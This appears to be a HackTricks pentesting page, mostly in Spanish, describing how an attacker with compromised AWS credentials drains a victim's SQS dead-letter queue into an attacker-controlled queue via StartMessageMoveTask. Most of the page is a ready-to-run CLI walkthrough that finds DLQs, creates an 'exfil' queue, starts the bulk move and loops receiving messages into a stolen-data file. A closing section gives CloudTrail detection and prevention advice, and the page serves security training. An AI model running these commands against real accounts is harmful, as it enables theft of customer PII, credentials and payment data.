# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Description

Abusar de las tareas de movimiento de mensajes de SQS para robar todos los mensajes acumulados de la Dead-Letter Queue (DLQ) de una víctima redirigiéndolos a una cola controlada por el atacante usando `sqs:StartMessageMoveTask`. Esta técnica explota la funcionalidad legítima de recuperación de mensajes de AWS para exfiltrar datos sensibles que se han ido acumulando en las DLQs con el tiempo.

## What is a Dead-Letter Queue (DLQ)?

Una Dead-Letter Queue es una cola SQS especial donde los mensajes se envían automáticamente cuando fallan al ser procesados correctamente por la aplicación principal. Estos mensajes fallidos a menudo contienen:
- Datos sensibles de la aplicación que no pudieron ser procesados
- Detalles de errores e información de depuración
- Información de Identificación Personal (PII)
- Tokens de API, credenciales u otros secretos
- Datos de transacciones críticos para el negocio

Las DLQs actúan como un "cementerio" para mensajes fallidos, lo que las convierte en objetivos valiosos ya que acumulan datos sensibles con el tiempo que las aplicaciones no pudieron manejar correctamente.

## Attack Scenario

**Real-world example:**
1. **Aplicación de e-commerce** procesa pedidos de clientes a través de SQS
2. **Algunos pedidos fallan** (problemas de pago, inventario, etc.) y se mueven a una DLQ
3. **La DLQ acumula** semanas/meses de pedidos fallidos que contienen datos de clientes: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **El atacante consigue acceso** a credenciales de AWS con permisos SQS
5. **El atacante descubre** que la DLQ contiene miles de pedidos fallidos con datos sensibles
6. **En lugar de intentar acceder a mensajes individuales** (lento y evidente), el atacante utiliza `StartMessageMoveTask` para transferir en masa TODOS los mensajes a su propia cola
7. **El atacante extrae** todos los datos sensibles históricos en una sola operación

## Requirements
- La cola origen debe estar configurada como DLQ (referenciada por al menos una RedrivePolicy de cola).
- IAM permissions (run as the compromised victim principal):
- En la DLQ (origen): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- En la cola destino: permiso para entregar mensajes (p. ej., política de cola que permita `sqs:SendMessage` desde el principal víctima). Para destinos en la misma cuenta esto suele permitirse por defecto.
- Si SSE-KMS está habilitado: en la CMK de origen `kms:Decrypt`, y en la CMK de destino `kms:GenerateDataKey`, `kms:Encrypt`.

## Impact
Exfiltrar cargas útiles sensibles acumuladas en DLQs (eventos fallidos, PII, tokens, payloads de aplicación) a alta velocidad usando las APIs nativas de SQS. Funciona cross-account si la política de la cola destino permite `SendMessage` desde el principal víctima.

## How to Abuse

- Identificar el ARN de la DLQ víctima y asegurarse de que realmente esté referenciada como DLQ por alguna cola (cualquier cola sirve).
- Crear o elegir una cola destino controlada por el atacante y obtener su ARN.
- Iniciar una tarea de movimiento de mensajes desde la DLQ víctima hacia tu cola destino.
- Monitorizar el progreso o cancelar si es necesario.

### CLI Example: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Un atacante ha comprometido credenciales de AWS y descubrió que una aplicación de e-commerce usa SQS con una DLQ que contiene intentos fallidos de procesamiento de pedidos de clientes.

1) **Descubrir y examinar la DLQ víctima**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Crear una cola de destino controlada por el atacante**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Ejecutar el robo masivo de mensajes**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Recopilar los datos sensibles robados**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Notas de cuentas cruzadas
- La cola de destino debe tener una política de recursos que permita al principal de la víctima `sqs:SendMessage` (y, si se usan, KMS grants/permissions).

## Por qué este ataque es efectivo

1. **Característica legítima de AWS**: Usa funcionalidad integrada de AWS, lo que dificulta detectarlo como malicioso
2. **Operación por lotes**: Transfiere miles de mensajes rápidamente en lugar de accederlos individualmente y de forma lenta
3. **Datos históricos**: DLQs acumulan datos sensibles durante semanas/meses
4. **Fuera del radar**: Muchas organizaciones no monitorizan de cerca el acceso a las DLQs
5. **Capaz entre cuentas**: Puede exfiltrar a la propia cuenta AWS del atacante si los permisos lo permiten

## Detección y prevención

### Detección
Monitoriza CloudTrail en busca de llamadas API `StartMessageMoveTask` sospechosas:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Prevención
1. **Principio de menor privilegio**: Restringir los permisos `sqs:StartMessageMoveTask` solo a los roles necesarios
2. **Supervisar DLQs**: Configurar alarmas de CloudWatch para actividad inusual en las DLQs
3. **Políticas entre cuentas**: Revisar cuidadosamente las políticas de colas SQS que permitan acceso entre cuentas
4. **Cifrar DLQs**: Usar SSE-KMS con políticas de claves restringidas
5. **Limpieza periódica**: No permitir que datos sensibles se acumulen en las DLQs indefinidamente

{{#include ../../../banners/hacktricks-training.md}}
